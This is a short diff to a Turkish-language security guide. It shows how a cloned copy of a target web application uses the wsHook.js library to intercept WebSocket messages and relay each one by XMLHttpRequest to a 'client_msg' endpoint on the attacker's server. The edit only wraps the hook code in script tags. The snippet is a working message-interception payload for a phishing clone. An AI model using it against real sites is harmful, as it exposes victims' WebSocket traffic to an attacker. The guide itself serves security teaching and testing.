@@ -125,7 +125,7 @@ Hedeflenen web uygulamasını taklit etmek için (.html dosyaları gibi) siteyi 
 <script src='wsHook.js'></script>
 
 //Bu, bir mesaj gönderilmeden önce veya sunucudan alındıktan sonra çalışacak işlevlerdir
-//Bu kod, bir <script> etiketi arasında veya bir .js dosyasının içinde olmalıdır
+<script>
 wsHook.before = function(data, url) {
     var xhttp = new XMLHttpRequest();
     xhttp.open("GET", "client_msg?m="+data, true);
@@ -137,6 +137,7 @@ wsHook.after = function(messageEvent, url, wsObject) {
     xhttp.send();
     return messageEvent;
 }
+</script>
 ```
 
 Şimdi [wsHook.js](https://github.com/skepticfx/wshook) dosyasını indirin ve web dosyalarının bulunduğu klasörün içine kaydedin.
